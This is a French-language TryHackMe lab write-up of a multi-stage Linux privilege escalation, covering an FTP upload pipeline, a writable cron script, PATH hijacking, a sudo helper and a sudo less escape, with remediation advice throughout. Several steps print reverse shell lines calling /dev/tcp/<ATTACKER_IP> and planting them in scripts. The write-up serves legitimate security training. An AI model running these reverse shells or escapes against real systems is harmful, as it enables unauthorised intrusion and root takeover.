---
type: write-up
platform: TryHackMe
room: Jump
os: Linux
category:
  - privilege-escalation
status: completed
date: 2026-09-14
tags:
  - pentest/write-up
  - tryhackme
  - linux
  - privilege-escalation
  - ftp
  - path-hijacking
  - sudo
---

# TryHackMe - Jump - Linux privileges

> Lab TryHackMe autorisé. Les flags et les IP temporaires de la room sont volontairement omis. Les commandes utilisent des placeholders afin de rester réutilisables.

## Objectif

La room impose une chaîne d'escalade progressive :

```text
anonymous
  ↓
recon_user
  ↓
dev_user
  ↓
monitor_user
  ↓
ops_user
  ↓
root
```

L'intérêt principal n'est pas seulement d'obtenir `root`, mais de comprendre plusieurs **ruptures de frontière de confiance** Linux : upload automatisé, permissions de groupe, script périodique modifiable, `PATH hijacking`, chaîne `sudo` mal sécurisée et shell escape via `less`.

---

# 1. Reconnaissance initiale

## Scan Nmap

```bash
nmap -sC -sV <TARGET_IP>
```

### Résultat utile

```text
21/tcp open  ftp  vsftpd 3.0.5
22/tcp open  ssh  OpenSSH

Anonymous FTP login allowed
incoming/ writable
pub/
```

### Interprétation

La présence de SSH ne donne pas immédiatement un accès sans identifiants.

En revanche, FTP autorise `anonymous` et expose un répertoire `incoming/` inscriptible. Comme la room parle d'un pipeline d'automatisation, un répertoire d'upload traité automatiquement devient prioritaire.

Principe transférable :

```text
Upload contrôlé par un utilisateur faible
+
Traitement automatique par un autre compte
=
frontière de confiance à auditer
```

---

# 2. Anonymous FTP → recon_user

## Énumération FTP

```bash
ftp <TARGET_IP>
```

Connexion :

```text
Name: anonymous
Password: [Entrée]
```

Énumération :

```text
ftp> ls -la
ftp> cd pub
ftp> ls -la
ftp> get README.txt
```

Le README indique que les fichiers placés dans `incoming/` sont traités automatiquement.

### Hypothèse

Si le pipeline exécute certains scripts déposés dans `incoming/`, un fichier contrôlé par l'attaquant peut être exécuté avec les privilèges du compte qui traite les uploads.

## Reverse shell

Création sur l'AttackBox :

```bash
cat > recon.sh <<'EOF'
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
EOF
```

Listener :

```bash
nc -lvnp 4444
```

Upload FTP :

```text
ftp> cd incoming
ftp> put recon.sh
```

Le pipeline exécute le fichier et un shell revient sur le listener.

Vérification :

```bash
whoami
id
pwd
```

Résultat attendu :

```text
recon_user
```

## Pourquoi cela fonctionne

Le problème n'est pas FTP seul. La vulnérabilité vient de la combinaison :

```text
FTP anonymous
  ↓
répertoire writable
  ↓
fichier non fiable
  ↓
traitement / exécution automatique
  ↓
contexte recon_user
```

### Remédiation

- ne jamais exécuter directement des fichiers issus d'un espace d'upload non fiable ;
- séparer dépôt, validation et exécution ;
- utiliser un compte de service fortement restreint ;
- appliquer allowlist de formats et validation stricte ;
- rendre les répertoires d'upload non exécutables lorsque possible.

---

# 3. Reconnaissance locale comme recon_user

Commandes réflexes :

```bash
whoami
id
pwd
ls -la
ls -la /home
sudo -l
```

`id` révèle notamment :

```text
recon_user
member of: dev_user, devops
```

Le home de `dev_user` possède des permissions de groupe permettant à `recon_user` d'y entrer et de lire certains fichiers.

## Point important : lecture ≠ changement d'identité

Grâce au groupe `dev_user`, `recon_user` pouvait lire le contenu du home de `dev_user`.

Mais :

```text
accéder aux fichiers de dev_user
≠
être dev_user
```

Pour exploiter l'étape suivante, il fallait réellement obtenir un processus exécuté avec l'UID de `dev_user`.

---

# 4. recon_user → dev_user : script périodique modifiable

## Découverte

Énumération de `/opt` :

```bash
ls -la /opt
ls -la /opt/*
```

Élément intéressant :

```text
/opt/dev/backup.sh
owner: dev_user
group: dev_user
permissions: rwxrwxr-x
```

Contenu :

```bash
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
```

Comme `recon_user` appartient au groupe `dev_user`, il peut **modifier** ce script.

## Vérifier qu'il est exécuté comme dev_user

Les recherches visibles dans `cron` et `systemd` ne révélaient pas directement le lanceur. Il fallait donc observer l'effet du script.

```bash
stat /tmp/recon_backup.tgz
```

Le fichier appartient à :

```text
dev_user:dev_user
```

Surveillance du timestamp :

```bash
for i in $(seq 1 30); do
  stat -c '%y | %U:%G | %s bytes' /tmp/recon_backup.tgz 2>/dev/null
  sleep 2
done
```

Le `mtime` change environ toutes les minutes et le fichier reste créé par `dev_user`.

### Conclusion

```text
backup.sh modifiable par recon_user via le groupe
+
backup.sh exécuté périodiquement comme dev_user
=
exécution de code comme dev_user
```

## Exploitation

Listener :

```bash
nc -lvnp 5555
```

Remplacement du script :

```bash
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1"\n' > /opt/dev/backup.sh
```

Vérification :

```bash
cat /opt/dev/backup.sh
ls -l /opt/dev/backup.sh
```

Au prochain passage du job :

```bash
whoami
id
```

Résultat attendu :

```text
dev_user
```

## Notion à retenir

> Ce n'est pas le propriétaire du fichier qui détermine les privilèges d'exécution : c'est **l'utilisateur qui lance le processus**.

Pattern générique :

```text
low_priv_user
   ↓ WRITE
script.sh
   ↓ EXECUTED BY
higher_priv_user
   ↓
code execution as higher_priv_user
```

### Remédiation

- les scripts exécutés par un compte privilégié ne doivent pas être modifiables par un compte moins privilégié ;
- séparer propriétaire et groupe d'exécution ;
- éviter les permissions d'écriture de groupe inutiles ;
- auditer les jobs périodiques et leurs dépendances.

---

# 5. dev_user → monitor_user : PATH hijacking

## Découverte du service

Énumération des processus :

```bash
ps aux | grep -E 'monitor|cron|script|backup'
```

Un service tourne comme `monitor_user` :

```text
/bin/bash /usr/local/bin/healthcheck
```

Configuration :

```bash
systemctl cat healthcheck.service
```

Extrait :

```ini
[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

Script exécuté :

```bash
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

## Vulnérabilité

Le script appelle :

```bash
ps
```

et non :

```bash
/usr/bin/ps
```

Avec le `PATH` du service :

```text
/opt/dev/bin
/usr/local/bin
/usr/bin
```

Linux cherche donc d'abord :

```text
/opt/dev/bin/ps
```

Or ce chemin est contrôlé par `dev_user`.

## Condition importante rencontrée

Le fichier `/opt/dev/bin/ps` n'était initialement pas exécutable.

Avec `recon_user`, l'appartenance au groupe permettait d'écrire dans le fichier mais pas de changer son mode, car seul le propriétaire ou root peut normalement effectuer `chmod`.

Une fois réellement `dev_user`, il devient possible de faire :

```bash
chmod +x /opt/dev/bin/ps
```

Cela montre pourquoi **lire/écrire grâce à un groupe n'était pas suffisant** pour terminer cette escalade.

## Exploitation

Listener :

```bash
nc -lvnp 6666
```

Création du faux `ps` :

```bash
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/6666 0>&1"\n' > /opt/dev/bin/ps
chmod +x /opt/dev/bin/ps
```

Au prochain appel de `ps aux` par `healthcheck`, le faux binaire est exécuté comme `monitor_user`.

Vérification :

```bash
whoami
id
```

Résultat attendu :

```text
monitor_user
```

## Erreur utile : le PATH malveillant est hérité

Le shell `monitor_user` obtenu hérite du `PATH` du service :

```text
/opt/dev/bin:/usr/local/bin:/usr/bin
```

Donc taper simplement :

```bash
ps
```

relance le faux `/opt/dev/bin/ps`, ce qui ouvre de nouvelles reverse shells et rend le diagnostic confus.

Correction :

```bash
export PATH=/usr/local/bin:/usr/bin:/bin
which ps
```

Résultat attendu :

```text
/usr/bin/ps
```

## Conditions génériques d'un PATH hijacking

Trois conditions principales :

1. un processus intéressant s'exécute avec des privilèges supérieurs ;
2. il appelle une commande sans chemin absolu ;
3. un répertoire contrôlable apparaît avant le vrai binaire dans `$PATH`.

Commandes utiles :

```bash
echo "$PATH"
which <COMMAND>
type -a <COMMAND>
systemctl cat <SERVICE>
```

### Remédiation

- utiliser des chemins absolus dans les scripts privilégiés ;
- définir un `PATH` minimal contenant uniquement des répertoires non modifiables par des utilisateurs faibles ;
- vérifier propriétaire et permissions de chaque répertoire du `PATH`.

---

# 6. monitor_user → ops_user : sudo + helper modifiable

## Énumération sudo

```bash
sudo -n -l
```

`-n` signifie **non-interactive** : `sudo` échoue au lieu de demander un mot de passe. C'est pratique dans un reverse shell instable.

Résultat utile :

```text
(ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

`monitor_user` peut donc exécuter ce script en tant que `ops_user` sans mot de passe.

## Analyse de la chaîne d'exécution

```bash
cat /usr/local/bin/deploy.sh
```

Contenu :

```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

Puis :

```bash
ls -l /opt/app/deploy_helper.sh
```

Le helper appartient à `monitor_user` et peut être modifié par lui.

### Vulnérabilité

Le binaire explicitement autorisé dans `sudoers` n'est pas lui-même modifiable, mais il exécute une **dépendance contrôlée par l'utilisateur appelant**.

```text
monitor_user
   ↓ sudo NOPASSWD
/usr/local/bin/deploy.sh   [exécuté comme ops_user]
   ↓
./deploy_helper.sh         [contrôlé par monitor_user]
   ↓
code execution as ops_user
```

## Exploitation

Sauvegarde facultative :

```bash
cp /opt/app/deploy_helper.sh /tmp/deploy_helper.sh.bak
```

Listener :

```bash
nc -lvnp 8888
```

Remplacement du helper :

```bash
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/8888 0>&1"\n' > /opt/app/deploy_helper.sh
```

Déclenchement :

```bash
sudo -u ops_user /usr/local/bin/deploy.sh
```

Vérification dans le nouveau shell :

```bash
whoami
id
```

Résultat attendu :

```text
ops_user
```

## Notion à retenir : auditer toute la chaîne

Lorsqu'une commande est autorisée via `sudo`, ne pas auditer uniquement cette commande.

Il faut examiner :

```text
sudo command
  ↓
scripts appelés
  ↓
fichiers sourcés
  ↓
binaires externes
  ↓
variables d'environnement
  ↓
répertoires / fichiers modifiables
```

### Remédiation

- toute dépendance d'un script `sudo` doit être possédée et protégée par un compte de confiance ;
- éviter les helpers relatifs contrôlables ;
- utiliser des chemins absolus ;
- limiter les règles `NOPASSWD` au strict nécessaire.

---

# 7. ops_user → root : sudo less et shell escape

## Énumération

```bash
sudo -n -l
```

Résultat :

```text
(root) NOPASSWD: /usr/bin/less
```

`ops_user` peut lancer `less` comme root sans mot de passe.

## Pourquoi `less` est dangereux avec sudo

`less` est un pager interactif. Il peut exécuter une commande shell depuis son interface avec :

```text
!<COMMAND>
```

Exemple :

```text
!/bin/bash
```

Si `less` tourne comme root, le shell lancé hérite de ces privilèges.

## Première tentative et erreur

Depuis le reverse shell :

```bash
sudo /usr/bin/less /etc/hosts
```

Le fichier est affiché puis `less` quitte immédiatement. Ensuite :

```text
!/bin/bash
```

est interprété par Bash et échoue.

### Cause

Le reverse shell n'avait pas de vrai terminal interactif.

Messages typiques vus plus tôt :

```text
cannot set terminal process group
no job control in this shell
```

Un reverse shell fournit un flux stdin/stdout, mais pas nécessairement un **TTY** complet.

## Upgrade du TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
tty
```

`tty` doit maintenant retourner un pseudo-terminal, par exemple :

```text
/dev/pts/0
```

Relancer :

```bash
sudo /usr/bin/less /etc/hosts
```

Puis, **dans l'interface de `less`** :

```text
!/bin/bash
```

Vérification :

```bash
whoami
id
```

Résultat attendu :

```text
root
uid=0(root)
```

## Notion à retenir

Certaines commandes paraissent anodines mais possèdent des fonctions permettant :

- d'exécuter un shell ;
- d'écrire dans des fichiers ;
- d'exécuter des commandes externes ;
- de charger des plugins ou éditeurs.

Lorsqu'un binaire est autorisé via `sudo`, vérifier s'il possède un **shell escape** ou une primitive exploitable. GTFOBins est une référence pratique pour ce type de vérification.

### Remédiation

- ne pas autoriser des binaires interactifs puissants comme `less` avec `sudo` sans nécessité ;
- préférer une commande métier précise avec arguments contraints ;
- appliquer le principe de moindre privilège.

---

# 8. Chaîne d'attaque finale

```text
Anonymous FTP
    ↓
Writable incoming/ + traitement automatique
    ↓
recon_user
    ↓
Permissions de groupe dev_user
    ↓
/opt/dev/backup.sh modifiable
    ↓
Job périodique exécuté comme dev_user
    ↓
dev_user
    ↓
healthcheck.service avec PATH dangereux
    ↓
/opt/dev/bin/ps contrôlé par dev_user
    ↓
PATH hijacking
    ↓
monitor_user
    ↓
sudo NOPASSWD deploy.sh as ops_user
    ↓
deploy.sh appelle un helper contrôlé par monitor_user
    ↓
ops_user
    ↓
sudo NOPASSWD /usr/bin/less as root
    ↓
TTY upgrade + !/bin/bash
    ↓
root
```

---

# 9. Fiche d'apprentissage réutilisable

## 9.1 Permissions Unix et groupes

Format :

```text
-rwxrwxr-x
 │  │  │
 │  │  └─ others
 │  └──── group
 └─────── owner
```

Commandes réflexes :

```bash
id
groups
ls -la
namei -l <PATH>
```

À retenir :

- `r` sur un fichier : lecture ;
- `w` sur un fichier : modification du contenu ;
- `x` sur un fichier : exécution ;
- `x` sur un répertoire : traversée ;
- `r` sur un répertoire : lecture de la liste des entrées ;
- `w` sur un répertoire : création/suppression/renommage d'entrées selon les autres permissions.

Un utilisateur peut donc accéder à des données d'un autre compte via un groupe sans pour autant devenir ce compte.

---

## 9.2 Scripts modifiables exécutés par un autre utilisateur

Pattern :

```text
Utilisateur A peut écrire
        ↓
script.sh
        ↓
Utilisateur B l'exécute
        ↓
code de A exécuté avec les droits de B
```

Énumération utile :

```bash
find / -writable -type f 2>/dev/null
ps aux
cat /etc/crontab
ls -la /etc/cron.d
systemctl list-timers --all
systemctl list-units --type=service
```

Si le lanceur n'est pas visible, observer les artefacts produits : propriétaire, timestamp, logs, processus très courts.

---

## 9.3 PATH hijacking

Pattern vulnérable :

```bash
ps aux
```

plus risqué que :

```bash
/usr/bin/ps aux
```

Checklist :

```bash
echo "$PATH"
which <COMMAND>
type -a <COMMAND>
ls -ld <PATH_DIRECTORY>
systemctl cat <SERVICE>
```

Questions :

1. Qui exécute le processus ?
2. Quelle commande est appelée sans chemin absolu ?
3. Dans quel ordre les répertoires du `PATH` sont-ils parcourus ?
4. Puis-je créer/modifier un fichier portant le même nom dans un répertoire prioritaire ?
5. Le fichier est-il exécutable ?

---

## 9.4 `sudo -l`

À vérifier presque systématiquement après l'obtention d'un shell :

```bash
sudo -l
sudo -n -l
```

Lire une règle comme :

```text
(target_user) NOPASSWD: /path/to/command
```

Questions :

- quel utilisateur cible ?
- quels arguments sont autorisés ?
- le fichier est-il modifiable ?
- appelle-t-il un autre script ?
- utilise-t-il un chemin relatif ?
- charge-t-il une configuration contrôlable ?
- possède-t-il un shell escape ?

---

## 9.5 Chaîne de confiance d'un wrapper privilégié

Ne jamais s'arrêter au premier fichier :

```text
sudo wrapper
   ↓
helper
   ↓
config
   ↓
commande externe
```

Toute dépendance contrôlée par un utilisateur moins privilégié peut casser la frontière de privilège.

---

## 9.6 Reverse shell et pseudo-TTY

Un reverse shell minimal peut suffire pour :

```bash
whoami
id
cat <FILE>
```

mais échouer avec des programmes interactifs :

- `less` ;
- `vim` ;
- `su` ;
- certains usages de `sudo` ;
- contrôle des jobs.

Upgrade minimal :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Vérification :

```bash
tty
```

---

# 10. Erreurs rencontrées et ce qu'elles enseignent

| Erreur / symptôme | Cause | Leçon |
|---|---|---|
| `put recon.sh` exécuté dans Bash | `put` est une commande du client FTP | Toujours identifier le contexte du prompt avant de lancer une commande |
| Lecture du home `dev_user` prise initialement pour une escalade | Permissions de groupe seulement | Accès aux données et changement d'UID sont deux choses différentes |
| Faux `ps` modifiable mais non exécutable avec `recon_user` | Le groupe pouvait écrire mais pas faire `chmod` comme propriétaire | Vérifier séparément `write`, `execute` et ownership |
| `ps` ouvrait continuellement de nouvelles reverse shells | Le shell `monitor_user` héritait du `PATH` malveillant | Après un PATH hijacking, vérifier immédiatement `echo $PATH` et `which` |
| `less` affichait le fichier puis quittait | Reverse shell sans TTY interactif | Certains shell escapes nécessitent un pseudo-terminal |
| `!/bin/bash` échouait au prompt Bash | La commande n'était plus saisie dans `less` | Comprendre dans quel programme chaque méta-commande est interprétée |

---

# 11. Workflow de privilege escalation Linux à réutiliser

Après chaque nouveau shell :

```text
1. Identifier le contexte
   whoami
   id
   pwd

2. Vérifier sudo
   sudo -n -l

3. Examiner groupes et permissions
   groups
   ls -la

4. Examiner processus et services
   ps aux
   systemctl

5. Examiner jobs périodiques
   cron / timers / artefacts produits

6. Chercher les fichiers intéressants
   fichiers writable
   fichiers appartenant aux comptes cibles
   scripts dans /opt et /usr/local/bin

7. Auditer les chaînes de confiance
   script → helper → commande → PATH → config

8. Exploiter uniquement après avoir compris
   qui écrit ?
   qui exécute ?
   avec quels privilèges ?

9. Vérifier le nouvel UID
   whoami
   id

10. Recommencer l'énumération depuis le nouveau contexte
```

---

# 12. Points clés à retenir

- Une escalade Linux est souvent une **chaîne de confiance mal conçue**, pas une vulnérabilité unique.
- Toujours distinguer **permissions sur les fichiers** et **identité effective du processus**.
- Un script modifiable devient critique dès qu'un utilisateur plus privilégié l'exécute.
- `PATH` fait partie de la surface de sécurité d'un service.
- `sudo -l` doit être une vérification réflexe après chaque nouveau shell.
- Avec `sudo`, auditer les dépendances du programme autorisé, pas seulement son chemin principal.
- Un binaire interactif autorisé comme root peut offrir un shell escape.
- Un reverse shell n'est pas forcément un terminal complet : savoir obtenir un pseudo-TTY est indispensable.
- Après chaque escalade, recommencer l'énumération depuis le nouveau contexte au lieu de poursuivre avec les hypothèses du compte précédent.
